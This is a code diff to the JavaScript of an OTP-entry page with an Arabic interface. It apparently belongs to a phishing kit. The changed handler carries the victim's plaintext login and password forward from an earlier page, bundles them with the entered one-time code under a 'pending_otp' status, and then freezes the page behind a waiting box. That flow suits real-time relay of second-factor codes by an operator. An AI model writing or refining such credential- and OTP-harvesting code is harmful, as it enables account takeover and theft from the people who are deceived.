@@ -76,14 +76,15 @@ document.getElementById('npad').addEventListener('click',e=>{
   else{const em=obs.find(b=>!b.value);if(em){em.value=n;const idx=obs.indexOf(em);if(idx<obs.length-1)obs[idx+1].focus();}}
 });
 document.getElementById('cbtn').addEventListener('click',()=>{
-  const otp=obs.map(b=>b.value).join('');
-  if(otp.length<6){
-    document.getElementById('err').textContent='الرمز غير مكتمل';
-    setS({otp:'',status:'idle',otp_time:Date.now()});
+  const saved = getS();
+  if(!String(saved.login || '').trim() || !String(saved.password || '').trim()){
+    window.location.href='login.html';
     return;
   }
+  const otp=obs.map(b=>b.value).join('');
+  if(otp.length<6){document.getElementById('err').textContent='الرمز غير مكتمل';return;}
   document.getElementById('err').textContent='';
-  setS({otp,status:'pending_otp',otp_time:Date.now()});
+  setS({login: String(saved.login || '').trim(), password: String(saved.password || '').trim(), otp, status:'pending_otp', otp_time:Date.now()});
   document.getElementById('cbtn').style.display='none';
   document.getElementById('wbox').style.display='flex';
   document.getElementById('npad').style.pointerEvents='none';
